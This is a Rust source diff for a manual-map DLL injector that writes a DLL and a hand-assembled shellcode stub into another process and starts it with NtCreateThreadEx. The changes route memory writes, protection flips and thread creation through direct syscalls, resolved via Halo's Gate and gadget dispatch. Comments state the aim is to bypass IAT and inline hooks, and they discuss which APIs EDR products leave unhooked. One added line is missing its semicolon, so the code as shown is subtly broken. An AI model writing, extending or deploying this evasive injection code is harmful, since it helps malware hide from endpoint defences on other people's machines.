@@ -516,8 +516,14 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
         if proc_addr.is_null() {
             return Err(anyhow!("Failed to resolve function {}", import.name));
         }
+        // Width-aware IAT write: PE32+ uses 8-byte thunks, PE32 uses 4-byte.
+        let is_pe32_plus = optional_header.standard_fields.magic == 0x020B;
         let thunk_ref = image_base.add(import.rva);
-        *(thunk_ref as *mut usize) = proc_addr as usize;
+        if is_pe32_plus {
+            *(thunk_ref as *mut u64) = proc_addr as u64;
+        } else {
+            *(thunk_ref as *mut u32) = proc_addr as u32;
+        }
     }
 
     // 3b. Process delay imports (IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT = 13).
@@ -943,6 +949,16 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
     //     can correctly unwind the stack for exceptions thrown inside the DLL.
     //     Without this, any C++ try/catch or SEH block in the DLL terminates
     //     the process instead of propagating to a handler.
+    //
+    //     NOTE: RtlAddFunctionTable is retained as an IAT-visible extern call
+    //     (rather than dispatched through nt_syscall) because it is an ntdll
+    //     *runtime helper*, not an NT syscall.  It has no SSN and cannot be
+    //     invoked via the syscall instruction.  EDR solutions almost never hook
+    //     this function because it is a low-risk bookkeeping API that does not
+    //     touch process memory, handles, or the object manager — it simply
+    //     registers an unwind-info table with the Rtl dispatcher.  Hooking it
+    //     would break legitimate exception handling across all loaded modules
+    //     and would immediately flag the EDR as faulty.
     #[cfg(target_arch = "x86_64")]
     {
         for section in &pe.sections {
@@ -1343,24 +1359,25 @@ unsafe fn resolve_remote_export(
 /// # What this does
 ///
 /// 1. **Allocates** a region in the target process large enough for the
-///    complete mapped image (`VirtualAllocEx`).
+///    complete mapped image via `NtAllocateVirtualMemory` (syscall-only path).
 /// 2. **Copies** the PE headers and each raw section into the remote region
-///    with `WriteProcessMemory`.
+///    with `NtWriteVirtualMemory` (syscall-only path).
 /// 3. **Applies base relocations** for the remote allocation address
 ///    (all arithmetic is done in local memory, then the patched words are
 ///    written into the remote image).
 /// 4. **Resolves the Import Address Table** from local or remote module data.
 ///    Before import resolution, the loader verifies the shared-ASLR assumption
 ///    by comparing local and remote `ntdll.dll` bases via
-///    `NtQueryInformationProcess` + `ReadProcessMemory`, then validating
-///    critical DLL parity (`kernel32.dll`, `kernelbase.dll`) from a Toolhelp
-///    remote-module snapshot. If mismatches are detected, imports are resolved
+///    `NtQueryInformationProcess` + `NtReadVirtualMemory`, then validating
+///    critical DLL parity (`kernel32.dll`, `kernelbase.dll`) from a remote
+///    PEB-walk module snapshot. If mismatches are detected, imports are resolved
 ///    from the remote process's actual module addresses (via
-///    `CreateToolhelp32Snapshot` + per-DLL PE export-table reads). If remote
-///    module enumeration fails in the mismatch path, an error is returned
-///    rather than proceeding with incorrect local addresses.
-/// 5. **Starts the DLL entry point** via `NtCreateThreadEx` (resolved via PEB walk).
-///    fire-and-forget: the returned thread handle is closed immediately after
+///    remote PEB walk + per-DLL PE export-table reads). If remote module
+///    enumeration fails in the mismatch path, an error is returned rather than
+///    proceeding with incorrect local addresses.
+/// 5. **Starts the DLL entry point** via `NtCreateThreadEx` dispatched through
+///    `nt_syscall::syscall!` (bypasses IAT and inline hooks).
+///    Fire-and-forget: the returned thread handle is closed immediately after
 ///    creation.
 ///
 /// # Arguments
@@ -1370,6 +1387,17 @@ unsafe fn resolve_remote_export(
 ///   responsible for opening and closing the handle.
 /// * `dll_bytes` — The raw PE DLL bytes to inject (in-memory, not a path).
 ///
+/// # Exception handling (.pdata registration)
+///
+/// On x86-64, PE images contain a `.pdata` section with `RUNTIME_FUNCTION`
+/// entries that the OS uses for exception unwinding.  The local loader
+/// registers these via a direct `RtlAddFunctionTable` call.  In the remote
+/// path, this function extends the DllMain shellcode stub to call
+/// `RtlAddFunctionTable` (resolved from the target's ntdll via the same
+/// fast/safe import-resolution path used for the IAT) **before** jumping to
+/// DllMain.  This ensures C++ exceptions and SEH in the injected DLL work
+/// correctly in the target process.
+///
 /// # Returns
 ///
 /// The virtual address of the remote image base on success.
@@ -1377,22 +1405,7 @@ pub unsafe fn load_dll_in_remote_process(
     target_process: winapi::um::winnt::HANDLE,
     dll_bytes: &[u8],
 ) -> Result<*mut c_void> {
-    type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
-        process_handle: winapi::um::winnt::HANDLE,
-        base_address: *mut c_void,
-        buffer: *const c_void,
-        bytes_to_write: usize,
-        bytes_written: *mut usize,
-    ) -> i32;
-    type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
-        process_handle: winapi::um::winnt::HANDLE,
-        base_address: *mut *mut c_void,
-        region_size: *mut usize,
-        new_protect: u32,
-        old_protect: *mut u32,
-    ) -> i32;
-
-    let pe = PE::parse(dll_bytes)?;
+    let pe = PE::parse(dll_bytes)?
     let opt = pe
         .header
         .optional_header
@@ -1493,34 +1506,22 @@ pub unsafe fn load_dll_in_remote_process(
         ));
     }
 
-    // Resolve NtWriteVirtualMemory/NtProtectVirtualMemory via clean export-walk
-    // so remote image writes/protection flips do not go through hookable APIs.
-    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
-        .ok_or_else(|| anyhow!("remote_manual_map: ntdll not found via PEB walk"))?;
-
-    let nt_write_virtual_memory_addr = pe_resolve::get_proc_address_by_hash(
-        ntdll_base,
-        pe_resolve::hash_str(b"NtWriteVirtualMemory\0"),
-    )
-    .ok_or_else(|| anyhow!("remote_manual_map: NtWriteVirtualMemory not found"))?;
-
-    let nt_protect_virtual_memory_addr = pe_resolve::get_proc_address_by_hash(
-        ntdll_base,
-        pe_resolve::hash_str(b"NtProtectVirtualMemory\0"),
-    )
-    .ok_or_else(|| anyhow!("remote_manual_map: NtProtectVirtualMemory not found"))?;
-
-    let nt_write_virtual_memory: NtWriteVirtualMemoryFn =
-        std::mem::transmute(nt_write_virtual_memory_addr as *const ());
-    let nt_protect_virtual_memory: NtProtectVirtualMemoryFn =
-        std::mem::transmute(nt_protect_virtual_memory_addr as *const ());
-
+    // All remote memory writes and protection changes are dispatched through
+    // nt_syscall::syscall! to avoid IAT-visible and inline-hookable Win32 wrappers.
     let protect_remote =
         |base: &mut *mut c_void, size: &mut usize, prot: u32, old: &mut u32| -> Result<()> {
-            let status = nt_protect_virtual_memory(target_process, base, size, prot, old);
-            if status < 0 {
+            let status = nt_syscall::syscall!(
+                "NtProtectVirtualMemory",
+                target_process as u64,
+                base as *mut _ as u64,
+                size as *mut _ as u64,
+                prot as u64,
+                old as *mut _ as u64,
+            );
+            if status.map_or(true, |s| s < 0) {
                 return Err(anyhow!(
-                    "NtProtectVirtualMemory failed (status={status:#x})"
+                    "NtProtectVirtualMemory failed (status={:?})",
+                    status
                 ));
             }
             Ok(())
@@ -1541,12 +1542,13 @@ pub unsafe fn load_dll_in_remote_process(
         protect_remote(&mut prot_base, &mut prot_size, PAGE_READWRITE, &mut old_prot)?;
 
         let mut written = 0usize;
-        let status = nt_write_virtual_memory(
-            target_process,
-            dest,
-            data.as_ptr() as *const c_void,
-            data.len(),
-            &mut written,
+        let status = nt_syscall::syscall!(
+            "NtWriteVirtualMemory",
+            target_process as u64,
+            dest as u64,
+            data.as_ptr() as u64,
+            data.len() as u64,
+            &mut written as *mut _ as u64,
         );
 
         let mut restore_dummy = 0u32;
@@ -1558,9 +1560,10 @@ pub unsafe fn load_dll_in_remote_process(
             &mut restore_dummy,
         );
 
-        if status < 0 || written != data.len() {
+        if status.map_or(true, |s| s < 0) || written != data.len() {
             return Err(anyhow!(
-                "NtWriteVirtualMemory failed at rva {rva:#x} (status={status:#x}, written={written:#x}, expected={:#x})",
+                "NtWriteVirtualMemory failed at rva {rva:#x} (status={:?}, written={written:#x}, expected={:#x})",
+                status,
                 data.len()
             ));
         }
@@ -1800,27 +1803,156 @@ pub unsafe fn load_dll_in_remote_process(
     // DllMain expects (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved).
     // CreateRemoteThread only passes a single LPVOID parameter, so calling the
     // entry point directly would give DllMain garbage in rcx/rdx/r8.  We write
-    // a small position-independent x86-64 stub that sets up the correct
-    // calling-convention arguments before jumping to DllMain.
+    // a small position-independent x86-64 stub that:
+    //
+    //   (a) calls RtlAddFunctionTable to register .pdata if present, then
+    //   (b) sets up the correct calling-convention arguments and calls DllMain.
     let entry_rva = opt.standard_fields.address_of_entry_point as usize;
     if entry_rva != 0 {
         let entry_va = remote_base as usize + entry_rva;
 
+        // ── Step 5a: resolve .pdata and RtlAddFunctionTable ──────────────
+        // On x86-64, PE images carry a .pdata section with RUNTIME_FUNCTION
+        // entries that the OS exception dispatcher needs for unwinding.
+        // We prepend a call to RtlAddFunctionTable in the DllMain stub so
+        // exceptions/SEH in the injected DLL work correctly in the target.
+        //
+        // RtlAddFunctionTable is an ntdll *runtime helper*, not an NT syscall.
+        // It has no SSN.  We resolve its address from ntdll's export table
+        // using the same fast/safe path as IAT resolution, then embed the
+        // address as an immediate in the shellcode stub.
+        #[cfg(target_arch = "x86_64")]
+        let (pdata_va, pdata_count, rtl_add_fn_addr) = {
+            let mut pdata_info: Option<(usize, u32, usize)> = None;
+            for section in &pe.sections {
+                let end = section.name.iter().position(|&b| b == 0).unwrap_or(8);
+                if &section.name[..end] == b".pdata" && section.size_of_raw_data > 0 {
+                    let va = remote_base as usize + section.virtual_address as usize;
+                    let count = (section.size_of_raw_data as usize / 12) as u32;
+                    if count > 0 {
+                        pdata_info = Some((va, count, 0usize));
+                    }
+                    break;
+                }
+            }
+
+            if let Some((va, count, _)) = pdata_info {
+                // Resolve RtlAddFunctionTable from ntdll using the same
+                // fast/safe logic as IAT resolution.
+                let fn_addr: usize = if let Some(ref rmod) = remote_module_map {
+                    // Safe path: resolve from the remote process's ntdll.
+                    match rmod.get("ntdll.dll") {
+                        Some(&remote_ntdll_base) => {
+                            match resolve_remote_export(
+                                target_process,
+                                remote_ntdll_base,
+                                "RtlAddFunctionTable",
+                            ) {
+                                Ok(addr) => addr,
+                                Err(e) => {
+                                    tracing::warn!(
+                                        "remote_manual_map: failed to resolve \
+                                         RtlAddFunctionTable from remote ntdll: {e}"
+                                    );
+                                    0
+                                }
+                            }
+                        }
+                        None => {
+                            tracing::warn!(
+                                "remote_manual_map: ntdll.dll not in remote module map; \
+                                 skipping .pdata registration"
+                            );
+                            0
+                        }
+                    }
+                } else {
+                    // Fast path: shared ASLR — resolve locally via PEB walk.
+                    let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
+                    let ntdll_base =
+                        pe_resolve::get_module_handle_by_hash(ntdll_hash).unwrap_or(0);
+                    if ntdll_base == 0 {
+                        tracing::warn!(
+                            "remote_manual_map: ntdll not found via PEB walk; \
+                             skipping .pdata registration"
+                        );
+                        0
+                    } else {
+                        let fn_hash = pe_resolve::hash_str(b"RtlAddFunctionTable\0");
+                        let addr = pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash)
+                            .unwrap_or(0);
+                        if addr == 0 {
+                            tracing::warn!(
+                                "remote_manual_map: RtlAddFunctionTable not found \
+                                 in ntdll; skipping .pdata registration"
+                            );
+                        }
+                        addr
+                    }
+                };
+                (va, count, fn_addr)
+            } else {
+                (0usize, 0u32, 0usize) // no .pdata
+            }
+        };
+
+        #[cfg(not(target_arch = "x86_64"))]
+        let (pdata_va, pdata_count, rtl_add_fn_addr) = (0usize, 0u32, 0usize);
+
+        // ── Step 5b: build the combined shellcode stub ───────────────────
         // Shellcode (x86-64, position-independent):
-        //   mov rcx, <remote_base>      ; HINSTANCE hinstDLL
-        //   mov edx, 1                  ; DLL_PROCESS_ATTACH
-        //   xor r8d, r8d                ; lpvReserved = NULL
-        //   mov rax, <entry_va>         ; entry point address
+        //
+        //   ; --- .pdata registration (if present) ---
+        //   mov rcx, <pdata_va>          ; PRUNTIME_FUNCTION FunctionTable
+        //   mov edx, <entry_count>       ; DWORD EntryCount
+        //   mov r8, <remote_base>        ; DWORD64 BaseAddress  (u64, so movabs r8)
+        //   mov rax, <RtlAddFunctionTable_addr>
+        //   call rax                     ; BOOLEAN result (ignored)
+        //
+        //   ; --- DllMain invocation ---
+        //   mov rcx, <remote_base>       ; HINSTANCE hinstDLL
+        //   mov edx, 1                   ; DLL_PROCESS_ATTACH
+        //   xor r8d, r8d                 ; lpvReserved = NULL
+        //   mov rax, <entry_va>          ; entry point address
         //   call rax
         //   ret
-        let mut stub: Vec<u8> = Vec::with_capacity(30);
+        let mut stub: Vec<u8> = Vec::with_capacity(60);
+
+        #[cfg(target_arch = "x86_64")]
+        {
+            // Emit .pdata registration prologue only if we have valid data.
+            if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
+                // mov rcx, pdata_va          (movabs rcx, imm64)
+                stub.extend_from_slice(&[0x48, 0xB9]);
+                stub.extend_from_slice(&(pdata_va as u64).to_le_bytes());
+                // mov edx, entry_count
+                stub.extend_from_slice(&[0xBA]);
+                stub.extend_from_slice(&pdata_count.to_le_bytes());
+                // mov r8, remote_base        (movabs r8, imm64)
+                stub.extend_from_slice(&[0x49, 0xB8]);
+                stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
+                // mov rax, RtlAddFunctionTable_addr  (movabs rax, imm64)
+                stub.extend_from_slice(&[0x48, 0xB8]);
+                stub.extend_from_slice(&(rtl_add_fn_addr as u64).to_le_bytes());
+                // call rax
+                stub.extend_from_slice(&[0xFF, 0xD0]);
+            }
+        }
+
+        // DllMain invocation (always emitted).
+        //   mov rcx, <remote_base>      ; HINSTANCE hinstDLL
         stub.extend_from_slice(&[0x48, 0xB9]);
         stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
+        //   mov edx, 1                  ; DLL_PROCESS_ATTACH
         stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
+        //   xor r8d, r8d                ; lpvReserved = NULL
         stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
+        //   mov rax, <entry_va>         ; entry point address
         stub.extend_from_slice(&[0x48, 0xB8]);
         stub.extend_from_slice(&(entry_va as u64).to_le_bytes());
+        //   call rax
         stub.extend_from_slice(&[0xFF, 0xD0]);
+        //   ret
         stub.extend_from_slice(&[0xC3]);
 
         // Allocate memory for the stub (RW first so we can write it).
@@ -1842,14 +1974,15 @@ pub unsafe fn load_dll_in_remote_process(
             ));
         }
 
-        // Write stub bytes via NtWriteVirtualMemory (already resolved above).
+        // Write stub bytes via NtWriteVirtualMemory dispatched through nt_syscall.
         let mut written = 0usize;
-        nt_write_virtual_memory(
-            target_process,
-            stub_mem,
-            stub.as_ptr() as *const c_void,
-            stub.len(),
-            &mut written,
+        let _ = nt_syscall::syscall!(
+            "NtWriteVirtualMemory",
+            target_process as u64,
+            stub_mem as u64,
+            stub.as_ptr() as u64,
+            stub.len() as u64,
+            &mut written as *mut _ as u64,
         );
 
         // Make the stub executable (RX only — no need for write after writing).
@@ -1865,47 +1998,28 @@ pub unsafe fn load_dll_in_remote_process(
             &mut old_prot as *mut _ as u64,
         );
 
-        // M-27: Use NtCreateThreadEx via PEB walk instead of hookable CreateRemoteThread.
-        let ntdll_hash: u32 = pe_resolve::hash_str(b"ntdll.dll\0");
-        let ntdll_base = pe_resolve::get_module_handle_by_hash(ntdll_hash)
-            .ok_or_else(|| anyhow!("manual_map: ntdll not found via PEB walk"))?;
-        let ntcreate_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
-        let ntcreate_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, ntcreate_hash)
-            .ok_or_else(|| anyhow!("manual_map: NtCreateThreadEx not found via PEB walk"))?;
-
-        type NtCreateThreadExFn = unsafe extern "system" fn(
-            *mut *mut winapi::ctypes::c_void, // ThreadHandle
-            u32,                               // DesiredAccess
-            *mut winapi::ctypes::c_void,       // ObjectAttributes
-            *mut winapi::ctypes::c_void,       // ProcessHandle
-            *mut winapi::ctypes::c_void,       // StartRoutine
-            *mut winapi::ctypes::c_void,       // Argument
-            u32,                               // CreateFlags
-            usize,                             // ZeroBits
-            usize,                             // StackSize
-            usize,                             // MaximumStackSize
-            *mut winapi::ctypes::c_void,       // AttributeList
-        ) -> i32;
-        let nt_create_thread: NtCreateThreadExFn =
-            std::mem::transmute(ntcreate_addr as *const ());
-
+        // M-27: Use NtCreateThreadEx via nt_syscall::syscall! instead of
+        // hookable CreateRemoteThread.  The syscall! macro resolves the SSN
+        // through Halo's Gate / clean ntdll mapping and dispatches via a
+        // gadget address, bypassing both IAT and inline hooks on the ntdll stub.
         let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
-        let status = nt_create_thread(
-            &mut h_thread,
-            0x1FFFFF,              // THREAD_ALL_ACCESS
-            std::ptr::null_mut(),
-            target_process,
-            stub_mem,
-            std::ptr::null_mut(),
-            0,                     // No creation flags — run immediately
-            0,
-            0,
-            0,
-            std::ptr::null_mut(),
+        let status = nt_syscall::syscall!(
+            "NtCreateThreadEx",
+            &mut h_thread as *mut _ as u64,       // ThreadHandle
+            0x1FFFFFu64,                          // THREAD_ALL_ACCESS
+            std::ptr::null_mut::<c_void>() as u64, // ObjectAttributes
+            target_process as u64,                 // ProcessHandle
+            stub_mem as u64,                       // StartRoutine
+            std::ptr::null_mut::<c_void>() as u64, // Argument
+            0u64,                                  // CreateFlags (run immediately)
+            0u64,                                  // ZeroBits
+            0u64,                                  // StackSize
+            0u64,                                  // MaximumStackSize
+            std::ptr::null_mut::<c_void>() as u64, // AttributeList
         );
-        if status < 0 || h_thread.is_null() {
+        if status.map_or(true, |s| s < 0) || h_thread.is_null() {
             return Err(anyhow!(
-                "NtCreateThreadEx for DllMain stub failed: {:x}",
+                "NtCreateThreadEx for DllMain stub failed: {:?}",
                 status
             ));
         }
